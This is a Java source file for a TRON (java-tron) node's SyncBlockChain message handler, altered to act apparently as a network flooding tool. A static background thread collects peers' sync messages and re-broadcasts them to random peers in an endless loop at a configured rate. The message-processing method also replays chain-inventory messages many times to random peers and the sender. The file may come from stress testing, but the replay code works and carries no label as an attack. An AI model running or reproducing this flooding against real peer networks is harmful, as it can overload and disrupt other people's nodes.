package org.tron.core.net.messagehandler;

import java.util.*;

import lombok.extern.slf4j.Slf4j;
import org.apache.commons.collections4.CollectionUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.tron.core.capsule.BlockCapsule.BlockId;
import org.tron.core.config.Parameter.NetConstants;
import org.tron.core.config.args.Args;
import org.tron.core.exception.P2pException;
import org.tron.core.exception.P2pException.TypeEnum;
import org.tron.core.net.TronNetDelegate;
import org.tron.core.net.TronNetService;
import org.tron.core.net.message.TronMessage;
import org.tron.core.net.message.adv.TransactionsMessage;
import org.tron.core.net.message.sync.ChainInventoryMessage;
import org.tron.core.net.message.sync.SyncBlockChainMessage;
import org.tron.core.net.peer.PeerConnection;
import org.tron.protos.Protocol;

@Slf4j(topic = "net")
@Component
public class SyncBlockChainMsgHandler implements TronMsgHandler {

  @Autowired
  private TronNetDelegate tronNetDelegate;





  private static volatile Map<Integer, TronMessage> msgGathered = new HashMap<>();
  private static volatile Map<Integer, TronMessage> msgQueue = new HashMap<>();

  private static volatile long msgQueueMaxSize = Args.getInstance().syncBlockChainMsgMaxQueueSize;
  private static volatile long msgMaxSpeed = Args.getInstance().syncBlockChainMsgMaxSpeed;

  private static volatile long[] msgTotalSent = {0};
  private static volatile long[] msgSuccessSent = {0};
  private static volatile long[] tmpTimestamp = {0};
  static {
    new Thread(() -> {
      if(msgQueueMaxSize == 0 || msgMaxSpeed ==0){
        logger.info("@@@ msgQueueMaxSize or msgMaxSpeed was not found in config file. task failed..");
        return;
      }
      while (true) {
        try {
          logger.info("@@@ msgQueue size {}, peers {}", msgQueue.size(), TronNetService.getPeers().size());
          if (msgQueue.size() >= msgQueueMaxSize && TronNetService.getPeers().size() >= 1) {
            tmpTimestamp[0] = System.currentTimeMillis();
            msgQueue.values().forEach(v -> {
              try{
                msgTotalSent[0]++;
                if (msgTotalSent[0] % msgMaxSpeed == 0) {
                  long s = tmpTimestamp[0] + 1000 - System.currentTimeMillis();
                  logger.info("&&& total send {}, success count {}, sleep {}ms", msgTotalSent[0], msgSuccessSent[0], s);
                  if (s > 0) {
                    Thread.sleep(s);
                  }
                  tmpTimestamp[0] = System.currentTimeMillis();
                  msgSuccessSent[0] = 0;
                }
              }catch (Exception e){}
              List<PeerConnection> list = TronNetService.getPeers();
              if (list.size() == 0) {
                logger.info("@@@ peer size == 0 return...");
                return;
              }
              int index = new Random().nextInt(list.size());
              PeerConnection peerConnection = list.get(index);
              peerConnection.sendMessage(v);
              msgSuccessSent[0]++;
            });
          } else {
            Thread.sleep(1000);
          }
        }catch (Exception e) {
          logger.error("@@@ adv msg failed.", e);
          try{ Thread.sleep(1000); }catch (Exception e2){}
        }
      }
    }).start();
  }

  public static volatile long cnt = 0;



  @Override
  public void processMessage(PeerConnection peer, TronMessage msg) throws P2pException {

    SyncBlockChainMessage syncBlockChainMessage = (SyncBlockChainMessage) msg;

    if (msgQueueMaxSize>0 && msgMaxSpeed >0){
      msgGathered.put(msg.hashCode(), msg);
      cnt++;
      logger.info("### cnt = {}, map1-size = {}, map2-size = {}",
          cnt, msgGathered.size(), msgQueue.size());
      if (msgGathered.size() >= msgQueueMaxSize) {
        msgQueue = msgGathered;
        msgGathered = new HashMap<>();
      }
    }

    if (!check(peer, syncBlockChainMessage)) {
      peer.disconnect(Protocol.ReasonCode.BAD_PROTOCOL);
      return;
    }

    long remainNum = 0;

    List<BlockId> summaryChainIds = syncBlockChainMessage.getBlockIds();
    BlockId headID = tronNetDelegate.getHeadBlockId();
    LinkedList<BlockId> blockIds = getLostBlockIds(summaryChainIds, headID);

    if (blockIds.size() == 0) {
      logger.warn("Can't get lost block Ids");
      peer.disconnect(Protocol.ReasonCode.INCOMPATIBLE_CHAIN);
      return;
    } else if (blockIds.size() == 1) {
      peer.setNeedSyncFromUs(false);
    } else {
      peer.setNeedSyncFromUs(true);
      remainNum = headID.getNum() - blockIds.peekLast().getNum();
    }



    peer.setLastSyncBlockId(blockIds.peekLast());
    peer.setRemainNum(remainNum);
    peer.sendMessage(new ChainInventoryMessage(blockIds, remainNum));
    long replayTimes = Args.getInstance().msgReplayDirectly;
    if(replayTimes>0 && Args.getInstance().chainInventoryMsgMaxSpeed > 0){
      List<PeerConnection> list = TronNetService.getPeers();
      if (list.size() == 0) {
        logger.info("@@@ peer size == 0 return...");
        return;
      }
      for(int i = 0 ; i< replayTimes; i++){
        int index = new Random().nextInt(list.size());
        PeerConnection peerConnection = list.get(index);
        peerConnection.sendMessage(new ChainInventoryMessage(blockIds, remainNum));
        peer.sendMessage(new ChainInventoryMessage(blockIds, remainNum));
      }
      logger.info("&&& {} messages has been replayed", replayTimes);
    }

  }

  private boolean check(PeerConnection peer, SyncBlockChainMessage msg) throws P2pException {
    List<BlockId> blockIds = msg.getBlockIds();
    if (CollectionUtils.isEmpty(blockIds)) {
      throw new P2pException(TypeEnum.BAD_MESSAGE, "SyncBlockChain blockIds is empty");
    }

    BlockId firstId = blockIds.get(0);
    if (!tronNetDelegate.containBlockInMainChain(firstId)) {
      logger.warn("Sync message from peer {} without the first block: {}",
              peer.getInetSocketAddress(), firstId.getString());
      return false;
    }

    long headNum = tronNetDelegate.getHeadBlockId().getNum();
    if (firstId.getNum() > headNum) {
      throw new P2pException(TypeEnum.BAD_MESSAGE,
          "First blockNum:" + firstId.getNum() + " gt my head BlockNum:" + headNum);
    }

    BlockId lastSyncBlockId = peer.getLastSyncBlockId();
    long lastNum = blockIds.get(blockIds.size() - 1).getNum();
    if (lastSyncBlockId != null && lastSyncBlockId.getNum() > lastNum) {
      throw new P2pException(TypeEnum.BAD_MESSAGE,
          "lastSyncNum:" + lastSyncBlockId.getNum() + " gt lastNum:" + lastNum);
    }

    return true;
  }

  private LinkedList<BlockId> getLostBlockIds(List<BlockId> blockIds, BlockId headID)
      throws P2pException {

    BlockId unForkId = getUnForkId(blockIds);
    LinkedList<BlockId> ids = getBlockIds(unForkId.getNum(), headID);

    if (ids.isEmpty() || !unForkId.equals(ids.peekFirst())) {
      unForkId = getUnForkId(blockIds);
      ids = getBlockIds(unForkId.getNum(), headID);
    }

    return ids;
  }

  private BlockId getUnForkId(List<BlockId> blockIds) throws P2pException {
    BlockId unForkId = null;
    for (int i = blockIds.size() - 1; i >= 0; i--) {
      if (tronNetDelegate.containBlockInMainChain(blockIds.get(i))) {
        unForkId = blockIds.get(i);
        break;
      }
    }

    if (unForkId == null) {
      throw new P2pException(TypeEnum.SYNC_FAILED, "unForkId is null");
    }

    return unForkId;
  }

  private LinkedList<BlockId> getBlockIds(Long unForkNum, BlockId headID) throws P2pException {
    long headNum = headID.getNum();

    long len = Math.min(headNum, unForkNum + NetConstants.SYNC_FETCH_BATCH_NUM);

    LinkedList<BlockId> ids = new LinkedList<>();
    for (long i = unForkNum; i <= len; i++) {
      if (i == headNum) {
        ids.add(headID);
      } else {
        BlockId id = tronNetDelegate.getBlockIdByNum(i);
        ids.add(id);
      }
    }
    return ids;
  }

}
